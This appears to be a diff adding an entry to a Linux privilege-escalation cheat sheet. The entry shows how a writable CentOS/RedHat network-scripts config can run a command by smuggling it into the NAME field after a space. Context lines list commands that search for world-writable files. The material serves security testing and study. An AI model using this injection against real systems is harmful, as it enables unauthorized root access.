@@ -497,6 +497,21 @@ find / -perm -2 -type f 2>/dev/null
 find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
 ```
 
+### Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)
+
+/etc/sysconfig/network-scripts/ifcfg-1337 for example
+
+```powershell
+NAME=Network /bin/id  &lt;= Note the blank space
+ONBOOT=yes
+DEVICE=eth0
+
+EXEC :
+./etc/sysconfig/network-scripts/ifcfg-1337
+```
+src : [https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f]
+(https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
+
 ### Writable /etc/passwd
 
 First generate a password with one of the following commands.
